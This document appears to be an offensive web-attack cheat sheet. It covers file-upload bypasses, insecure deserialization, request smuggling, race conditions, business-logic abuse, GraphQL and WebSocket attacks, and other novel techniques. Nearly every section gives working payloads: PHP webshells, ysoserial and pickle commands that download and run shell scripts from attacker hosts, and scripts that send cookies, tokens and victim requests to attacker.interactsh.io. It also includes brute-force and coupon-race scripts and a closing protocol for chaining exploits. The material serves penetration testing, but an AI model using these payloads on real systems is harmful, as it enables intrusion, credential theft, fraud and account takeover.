# DEVIL'S DEN — ADVANCED ATTACKS + DESERIALIZATION + UNIQUE VULNS v1.0
# File Upload · Deserialization · Race Conditions · Business Logic · GraphQL · Novel Attacks

---

## FILE UPLOAD ATTACKS

### Extension Bypass
```
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phar
shell.shtml
shell.shtm
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php\x00.jpg
shell.PhP
shell.PHP
shell.PHp
```

### MIME + Content-Type Tricks
```
# File: PHP webshell
# Content-Type: image/jpeg
# Magic bytes: prepend GIF89a; before <?php
GIF89a;<?php system($_GET['cmd']); ?>

# Polyglot: valid JPEG AND valid PHP
# ImageMagick exploit via SVG:
<image authenticate='ff" `curl http://attacker.interactsh.io/$(id|base64)`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="msl:/tmp/magick-XXXXXX" />
  </svg>
</image>
```

### SVG XSS Upload
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='https://attacker.interactsh.io/?c='+document.cookie</script>
</svg>
```

### XXE via DOCX/XLSX Upload
```
# Unzip DOCX, add to word/document.xml:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document>&xxe;</w:document>
# Rezip and upload
```

### Zip Slip
```python
# Create malicious zip:
import zipfile
zf = zipfile.ZipFile('evil.zip', 'w')
zf.write('/etc/passwd', '../../../../var/www/html/shell.php')
zf.close()
# Payload inside: <?php system($_GET['cmd']); ?>
```

### IIS Parsing Bypass
```
shell.asp;.jpg
shell.asp:.jpg
shell.asp%00.jpg
```

### Apache Bypass (unknown extension fallback)
```
shell.php.xxx
shell.php.unknown
shell.phptest
```

### Race Condition — Upload Then Execute
```
# Thread 1: POST /upload (upload shell.php)
# Thread 2: GET /uploads/shell.php (execute before validation moves/deletes it)
# Use Turbo Intruder or asyncio for simultaneity
```

---

## INSECURE DESERIALIZATION

### Java — Detection Signatures
```
# Base64 magic bytes: rO0AB (Java serialized object)
# Hex: AC ED 00 05
# In cookies: JSESSIONID, rememberMe (Apache Shiro), viewState, .VIEWSTATE
```

### Java — ysoserial Gadget Chains
```bash
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections2 'curl http://attacker.interactsh.io/$(id|base64)' | base64
java -jar ysoserial.jar CommonsCollections3 'wget http://attacker.interactsh.io/shell.sh -O /tmp/s && bash /tmp/s' | base64
java -jar ysoserial.jar CommonsCollections4 'id' | base64
java -jar ysoserial.jar CommonsCollections5 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'id' | base64
java -jar ysoserial.jar CommonsCollections7 'id' | base64
java -jar ysoserial.jar Spring1 'id' | base64
java -jar ysoserial.jar Spring2 'id' | base64
java -jar ysoserial.jar Hibernate1 'id' | base64
java -jar ysoserial.jar JSON1 'id' | base64
java -jar ysoserial.jar BeanShell1 'id' | base64
java -jar ysoserial.jar Groovy1 'id' | base64
java -jar ysoserial.jar ROME 'id' | base64
java -jar ysoserial.jar JRMPClient 'attacker.interactsh.io:1099' | base64
java -jar ysoserial.jar URLDNS 'http://attacker.interactsh.io' | base64
```

### Apache Shiro — RememberMe Cookie Deserialization
```bash
# Detect: Response has Set-Cookie: rememberMe=deleteMe → Shiro is present
# Exploit: encrypt ysoserial payload with Shiro's default AES key
# Common keys: kPH+bIxk5D2deZiIxcaaaA==, 2AvVhdsgUs0FSA3SDFAdag==
# Tool: shiro_attack, ysoserial-modified
python3 shiro_exploit.py -u http://target.com -k "kPH+bIxk5D2deZiIxcaaaA==" -p "id"
```

### PHP Object Injection
```
# Detection: serialized data in cookies/params: O:8:"UserData":...
# Payload: craft object that calls dangerous magic methods (__wakeup, __destruct, __toString)

# Generic detection:
O:1:"a":0:{}
a:1:{i:0;O:1:"a":0:{}}

# Gadget chains:
# Symfony: https://github.com/ambionics/symfony-exploits
# Laravel: phpggc Laravel/RCE1
# Guzzle: phpggc Guzzle/FW1
```

```bash
# phpggc tool for PHP gadget chains:
phpggc Laravel/RCE1 system id
phpggc Symfony/RCE4 system id
phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET[0]);?>'
phpggc Zend/RCE3 system id
phpggc Yii/RCE1 system id
```

### Python Pickle — RCE by Design
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.interactsh.io/$(id|base64)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# Any application that pickle.loads(user_input) → instant RCE
# Common surfaces: ML model uploads, session cookies, cached objects
```

### Node.js — node-serialize IIFE Exploit
```javascript
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id',function(error, stdout, stderr){console.log(stdout)});}()"}
```

### .NET — ViewState Without MAC
```bash
# Detect: __VIEWSTATE param in form, no __VIEWSTATEMAC or weak key
ysoserial.exe -p ViewState -g ActivitySurrogateSelector -c "id"
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "id" --islegacy
```

---

## HTTP REQUEST SMUGGLING

### CL.TE (Content-Length + Chunked)
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.TE — Obfuscated Transfer-Encoding
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, identity
Transfer-Encoding:  chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: x-custom, chunked
X-Transfer-Encoding: chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
```

### H2.CL (HTTP/2 Downgrade)
```
:method POST
:path /
:authority target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

### Smuggling to Steal Session Tokens
```
POST / HTTP/1.1
Host: target.com
Content-Length: 324
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.interactsh.io
Content-Length: 1000

VICTIM_REQUEST_WILL_BE_APPENDED_HERE
```

---

## RACE CONDITIONS

### Python asyncio Template (for max simultaneity)
```python
import asyncio, aiohttp

async def redeem(session, url, code):
    async with session.post(url, json={"code": code}) as r:
        return await r.text()

async def race():
    url = "https://target.com/api/redeem"
    async with aiohttp.ClientSession(headers={"Cookie":"session=ATTACKER"}) as s:
        tasks = [redeem(s, url, "PROMO50") for _ in range(50)]
        results = await asyncio.gather(*tasks)
        for r in results: print(r)

asyncio.run(race())
```

### Turbo Intruder Last-Byte Sync (Burp)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race')
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### HTTP/2 Single-Packet Attack
```
# Send 50 requests in one TCP/TLS frame → server processes truly simultaneously
# Tool: h2c, Turbo Intruder with HTTP/2
```

### Race Window Targets
```
- Coupon/promo code redemption
- Gift card balance withdrawal
- Vote/rating submission
- One-time invite link usage
- Email confirmation link
- Password reset token use
- API rate limit counters
- Daily reward claiming
- Flash sale purchases
- Free trial activation
```

---

## BUSINESS LOGIC ATTACKS

### Negative Value Injection
```
quantity=-1&price=10.00        → credit $10 to account
amount=-0.01                    → add money instead of charge
quantity=-999&product_id=X      → massive credit
tip=-5.00                       → reduce bill below 0
```

### Integer Overflow
```
2147483648       (INT_MAX+1 for 32-bit signed)
9223372036854775808   (LONG_MAX+1 for 64-bit)
4294967296       (UINT_MAX+1)
-2147483648      (INT_MIN)
99999999999999999999  (arbitrary large)
```

### Currency/Unit Confusion
```
# Change amount in USD to VND (x23000 multiplier)
{"amount": 1, "currency": "VND"}   → $1 treated as ₫1 → 0.004 cents charged
# EUR → JPY confusion
# Change unit: grams → kilograms
```

### Workflow / Step Bypass
```
# Multi-step checkout: submit step 5 (payment) with fresh session (no steps 1-4)
# Password change without old password (if step 1 session not validated in step 2)
# Email verification skip: directly use features requiring verified email
# KYC bypass: access withdraw endpoint before KYC step validated server-side
```

---

## GRAPHQL ATTACKS

### Introspection Dump
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
      fields { name args { name type { name kind } } }
    }
  }
}
```

### Batching Attack (DoS / Rate Limit Bypass)
```json
[
  {"query": "mutation { login(username:\"admin\", password:\"a\") { token } }"},
  {"query": "mutation { login(username:\"admin\", password:\"b\") { token } }"},
  ...repeat 1000 times...
]
```

### Alias Abuse (Rate Limit Bypass for Brute Force)
```graphql
{
  a1: login(username:"admin",password:"pass1") { token }
  a2: login(username:"admin",password:"pass2") { token }
  a3: login(username:"admin",password:"pass3") { token }
}
```

### Deep Nesting DoS
```graphql
{ user { posts { comments { author { posts { comments { author { posts { comments { author {
  id name email
}}}}}}}}}}
```

### IDOR via GraphQL
```graphql
query { user(id: "VICTIM_ID") { email phone ssn creditCards { number } } }
```

### GraphQL Field Suggestion Enumeration (introspection blocked)
```graphql
{ __typename }
{ user { adminFlag } }
# → "Cannot query field 'adminFlag' on type 'User'. Did you mean 'is_admin'?"
# → field name revealed via error message
```

---

## WEBSOCKET ATTACKS

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<script>
var ws = new WebSocket('wss://target.com/chat');
ws.onopen = function() { ws.send(JSON.stringify({type:'join',room:'private'})) };
ws.onmessage = function(e) {
  fetch('https://attacker.interactsh.io/?d='+btoa(e.data));
};
</script>
```

### WebSocket Message Manipulation
```json
{"type":"message","to":"admin","content":"<script>alert(1)</script>"}
{"type":"admin","action":"getUsers"}
{"user_id":"VICTIM_ID","action":"read_messages"}
```

---

## UNIQUE / NOVEL VULNERABILITIES

### Cache Deception Attack
```
GET /profile/settings.css HTTP/1.1
# Server returns user profile data (not a CSS file)
# CDN caches it as CSS
# Attacker fetches same URL → gets victim's cached profile
# Trigger: send victim link to /account/profile.css
```

### Dangling Markup Injection (steal data without JS)
```html
<!-- Inject: "><img src='https://attacker.interactsh.io/?data= -->
<!-- Browser fetches image URL with everything until next quote as part of the URL -->
<!-- Exfiltrates CSRF token, API keys, any text on page -->
```

### Service Worker Poisoning
```javascript
// If CSP allows 'self' for service workers and there's open redirect:
// Register malicious service worker via open redirect to JS file on same origin
navigator.serviceWorker.register('/redirect?url=//attacker.com/sw.js')
// sw.js intercepts all requests from victim's browser
```

### Cookie Tossing (Subdomain → Parent)
```javascript
// From XSS on subdomain.target.com:
document.cookie = "session=ATTACKER_SESSION; domain=.target.com; path=/";
// Victim's requests to target.com now include attacker's session cookie
// If app picks first cookie → session fixation → account takeover
```

### 403 Bypass Techniques
```
GET /admin → 403
GET /.//admin → 200?
GET /ADMIN → 200?
GET /%2fadmin → 200?
GET /admin/ → 200?
GET //admin → 200?
GET /admin/. → 200?
GET /admin%20 → 200?
GET /admin%09 → 200?
Headers:
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### HTTP Method Override Bypass
```
POST /admin/deleteUser
X-HTTP-Method-Override: DELETE
_method=DELETE   (in body)
X-Method-Override: DELETE
X-HTTP-Method: DELETE
```

### Type Juggling (PHP == vs ===)
```
# PHP loose comparison:
"admin" == 0    → TRUE
"1admin" == 1   → TRUE
"0e123" == "0e456"  → TRUE (both treated as 0*10^n)
null == false   → TRUE
[] == false     → TRUE
# Exploit: login with password=0 if hash starts with 0e
```

### Account Oracle via Timing
```bash
# Measure response time for registered vs unregistered emails:
time curl -s -o /dev/null -X POST https://target.com/forgot-password -d "email=admin@target.com"
time curl -s -o /dev/null -X POST https://target.com/forgot-password -d "email=notexist@target.com"
# Difference in timing reveals registered emails
```

### Subdomain Takeover — Full Checklist
```bash
# Check dangling CNAMEs:
subfinder -d target.com | dnsx -cname | grep -v "target.com$"
# Services to check: AWS S3, GitHub Pages, Heroku, Azure, Fastly, Ghost, Shopify
# Verify: dig CNAME sub.target.com → some-app.github.io
# Test: curl sub.target.com → 404 from GitHub Pages → claimable!
subzy run --targets subs.txt --concurrency 100
```

### SMTP Header Injection → Phishing from Target's Infra
```
# Inject in any email header field (name, subject, etc.):
Victim Name\r\nBcc: attacker@evil.com
Subject: Test\r\nTo: attacker@evil.com
# Result: target's mail servers send phishing to attacker's targets
```

### Web Cache Deception (Force Victim to Cache Own Data)
```
# Send victim:
https://target.com/account/profile/nonexistent.css
# App ignores .css extension, serves profile page
# CDN caches it (thinks it's a static CSS)
# Attacker fetches same URL → gets victim's profile data
```

### CSS Injection → CSRF Token Exfiltration (No JavaScript)
```css
input[name="csrf_token"][value^="a"]{background:url(https://attacker.interactsh.io/a)}
input[name="csrf_token"][value^="b"]{background:url(https://attacker.interactsh.io/b)}
/* Repeat for each character → recover full token → forge requests */
```

### ReDoS (Regular Expression DoS)
```
# Patterns with nested quantifiers: (a+)+ (a|a)+ ([a-zA-Z]+)*
# Test: send string that causes catastrophic backtracking
aaaaaaaaaaaaaaaaaaaaaaaaaaaaX
aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
# If server hangs → DoS confirmed
# Report as High if it affects authentication endpoint
```

### Path-Relative Style Import (Steal Nonce)
```html
<!-- Inject partial tag that causes browser to import CSS from attacker -->
<!-- CSS import reads nonce from style attribute: -->
@import url(https://attacker.interactsh.io/?nonce=
<!-- When browser closes the import → nonce leaked in URL -->
```

### Self-Learning Code Analysis Protocol
```
When examining any target JavaScript/source:
1. Extract URL patterns: /api/v[0-9]+/[a-zA-Z0-9_/-]+
2. Extract fetch/axios/XHR calls → all API endpoints + params
3. Find all regex validators → craft bypass for exact pattern
4. Find all auth checks → enumerate bypass paths
5. Grep for: eval, innerHTML, document.write, setTimeout → DOM XSS
6. Grep for: postMessage → check origin validation
7. Grep for: __proto__, prototype → prototype pollution vectors
8. Grep for: pickle, serialize, deserialize, marshal → deserialization
9. Grep for: api_key, secret, token, password, credential → hardcoded secrets
10. Extract role names / permission strings → use in mass assignment
11. Map trust relationships between components
12. Build target-specific wordlist from app's vocabulary
13. Generate regex-specific bypass payloads from discovered patterns
14. Create chained exploit from combined findings
```
